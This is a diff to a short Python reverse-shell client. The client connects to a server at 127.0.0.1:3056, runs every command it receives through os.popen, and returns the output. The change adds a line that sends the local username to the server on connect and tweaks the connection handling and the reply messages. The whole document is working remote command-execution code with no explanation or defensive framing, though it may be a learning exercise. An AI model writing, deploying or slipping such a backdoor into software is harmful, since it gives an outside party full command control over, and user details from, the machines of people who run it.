@@ -1,6 +1,6 @@
 import socket
+from getpass import getuser
 import os, sys
-import subprocess
 
 SERVER_IP = '127.0.0.1'
 SERVER_PORT = 3056
@@ -9,16 +9,16 @@ ADDR = (SERVER_IP, SERVER_PORT)
 
 
 client_socket = socket.socket()
-client_socket.connect(ADDR)
 try:
+    client_socket.connect(ADDR)
+    client_socket.sendall(getuser().encode())
     while True:
-        print('Waiting...')
         cmd = client_socket.recv(SIZE).decode()
         if cmd[0:2] == "cd":
             os.chdir(cmd[3:])
         res = os.popen(cmd).read()
         if res == "":
-            client_socket.sendall("Success command".encode())
+            client_socket.sendall("No result".encode())
         else:
             client_socket.sendall(res.encode())
 except:
